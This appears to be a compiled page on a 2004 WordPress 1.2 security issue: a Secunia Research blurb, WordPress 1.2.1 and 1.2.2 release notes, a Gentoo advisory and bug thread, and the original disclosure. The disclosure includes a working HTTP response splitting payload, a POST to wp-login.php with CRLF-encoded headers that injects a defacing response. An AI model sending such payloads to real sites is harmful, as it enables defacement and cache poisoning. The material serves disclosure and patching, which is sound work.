How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# WordPress 1.2.2

---

WordPress 1.2.2 is now officially available for [download](https://wordpress.org/download/). This release fixes a few bugs and security issues and is recommended for all 1.2 users. There have only been minor changes since the last release, so if you’re upgrading from any 1.2 version you can follow [the normal upgrade instructions](https://codex.wordpress.org/Upgrading).

Here’s a few of the things we’ve addressed in this release:

* Login problems
* A security fix for a specific IIS/PHP combination
* Last-modified header bug
* An issue with the way site moves were handled
* Email encoding issues

Sorry this took longer to get out than some people thought it should, a couple of issues came up at the same time and we wanted to roll everything into one release so you wouldn’t have to upgrade multiple times. If you have any problems please let us know in the [support forums](https://wordpress.org/support/).

Update: Wondering what files changed? [Here’s a list](https://codex.wordpress.org/Changelog/1.2#Version_1.2.2).

# WordPress 1.2.1

---

I am relieved to announce that [WordPress 1.2.1 is now available for download](https://wordpress.org/download/). This release addresses a few bugs and minor security issues with 1.2. We’ve also backported the new login system from 1.3 that is much friendlier and should address many of the problems people have had with logging in and cookies.

#### Upgrading

Upgrading from 1.2 is very easy. Your existing templates and plugins should work just fine; all you need to do is overwrite the WordPress **files and folders**. To upgrade:

1. [Download 1.2.1](https://wordpress.org/download/)
2. Unzip
3. Upload the new files to your site, taking care not to overwrite anything you may have modified like `index.php`

#### Security Issues

Those of you who follow security lists may have noticed there was an announcement about WordPress a few days ago. This announcement was not entirely accurate and several articles have been published subsequently that feed off the hype. We take security very seriously, and the last WordPress advisory was over a year ago despite the astronomical growth we’ve experienced. Unfortunately the author of the advisory *did not* contact us before he published the problem so we found out about this when everyone else did. Most responsible security professionals contact the vendor first and in that case we could have released the fix at the same time the problem was announced. Fortunately it was a fairly low-risk problem and we have had no reports of anyone being affected.

At the same time we were responsibly notified of a related but separate problem in the code related to [HTTP response splitting](http://www.sanctuminc.com/pdf/Whitepaper_HTTPResponse.pdf) (PDF link) by “Chaotic Evil.” Some have asked why it took a few days for 1.2.1 to be released, and this is why. We wanted to be sure we addressed both problems and fully tested everything because a premature release would do more harm than good.

I want to thank Chaotic Evil for professionally notifying us of the problem and letting us address it before he announced it. Also thank you to our fantastic beta testers who helped us with this very rapid release cycle, and finally to the WordPress community for being so supportive while we prepared these fixes.

# WordPress: HTTP response splitting and XSS vulnerabilities — GLSA **200410-12**

WordPress contains HTTP response splitting and cross-site scripting
vulnerabilities.

### Affected packages

| Package | **www-apps/wordpress** on all architectures |
| --- | --- |
| Affected versions | < **1.2.2** |
| Unaffected versions | >= **1.2.2** |

### Background

WordPress is a PHP and MySQL based content management and publishing
system.

### Description

Due to the lack of input validation in the administration panel
scripts, WordPress is vulnerable to HTTP response splitting and
cross-site scripting attacks.

### Impact

A malicious user could inject arbitrary response data, leading to
content spoofing, web cache poisoning and other cross-site scripting or
HTTP response splitting attacks. This could result in compromising the
victim's data or browser.

### Workaround

There is no known workaround at this time.

### Resolution

All WordPress users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-apps/wordpress-1.2.2"
```

Solution: There is not any solution yet. I contacted Matthew Mullenweg, one of the lead developers of wordpress, on Wednesday but I did not receive any answer until yet.  Credits: Thomas Waldegger ```  [Comment 1](#c1)  Dan Margolis (RETIRED)   gentoo-dev  2004-09-29 08:25:51 UTC  ``` I saw this on bugtraq, but I'm confused. Is he saying that if you visit, say, /wp-login.php?redirect_to=<http://evilhacker.ru/wussy_IE_vulnerability.html>, you'll end up going to this evil russian hacker's site and downloading a wussy IE vulnerability?   All of these instances seem to be the same; the risk is only there if some administrator voluntarily visits that URL. I guess it means if you're a slashdot troll, you can post URLs that appear to be from one site and really are from another, but other than that I just don't see what the big deal here is.   So unless I'm mistaken, I'd say this isn't much of a security bug (or at least deserves no GLSA).  ```  [Comment 2](#c2)  Thierry Carrez (RETIRED)   gentoo-dev  2004-09-29 11:40:45 UTC  ``` Nah, it allows script injection, probably from inside the blog. Clearly XSS.  WordPress acknowledged it at : <http://wordpress.org/support/4/13818> They are getting a 1.2.1 version ready. ```  [Comment 3](#c3)  Luke Macken (RETIRED)   gentoo-dev  2004-10-01 13:09:45 UTC  ``` I'll keep an eye on upstream ;) ```  [Comment 4](#c4)  Luke Macken (RETIRED)   gentoo-dev  2004-10-06 18:21:55 UTC  ``` <http://wordpress.org/development/2004/10/wp-121/>  web-apps, please bump to 1.2.1 ```  [Comment 5](#c5)  Peter Westwood    2004-10-07 00:53:18 UTC  ``` Created [attachment 41262](attachment.cgi?id=41262 "Ebuild for v1.2.1") [[details](attachment.cgi?id=41262&action=edit "Ebuild for v1.2.1")] Ebuild for v1.2.1  I have updated the v1.2r1 ebuild for v1.2 Login problems should now be fixed so I have commented out the patch that was previously used. At the moment the line for the Post Install instructions is commented out too. I think that the ones from v1.2 should be fine though.  I have this installed and running fine on my site - webapp-config upgraded my previous v1.2 install sucessfully. ```  [Comment 6](#c6)  Stuart Herbert (RETIRED)   gentoo-dev  2004-10-08 13:21:14 UTC  ``` Added to CVS.  I still had to patch the login code in order to work locally, but at least the patch was much smaller this time.  We need others to test the patch before we can mark this ebuild as stable.

SECURITY ADVISORY: HTTP Response Splitting in WordPress 1.2

AUTHOR: Chaotic Evil (chaoticevil $$$at$$$ spyring $$$dot$$$ com)

DATE: October 6th, 2004

PRODUCT: WordPress 1.2 (wordpress.org)

FROM THE VENDOR WEBSITE:
WordPress is a state-of-the-art semantic personal
publishing platform with a focus on aesthetics, web
standards, and usability. What a mouthful. WordPress is
both free and priceless at the same time.

WordPress was born out of a desire for an elegant, well-
architectured personal publishing system built on PHP
and MySQL and licensed under the GPL.

SECURITY VULNERABILITY
HTTP Response Splitting [[1]](#1).

EXPLOIT:
HOSTNAME, USER and PASS should be replaced with the
relevant values (and Content-Length needs to be adjusted
accordingly). Replace curly braces with less-than and
greater-than signs. Code is line wrapped.

POST /wp-login.php HTTP/1.0
Host: HOSTNAME
Content-Type: application/x-www-form-urlencoded
Content-length: 226

action=login&mode=profile&log=USER&pwd=PASS&text=
%0d%0aConnection:%20Keep-Alive%0d%0aContent-Length:%20
0%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:
%2021%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}
*defaced*{/html}

VENDOR STATUS: Vendor contacted September 24th. Vendor
worked closely with the author and promptly produced a
fix (see below).

FIX: Use WordPress 1.2.1. See vendor site:
<http://wordpress.org/development/2004/10/wp-121/>
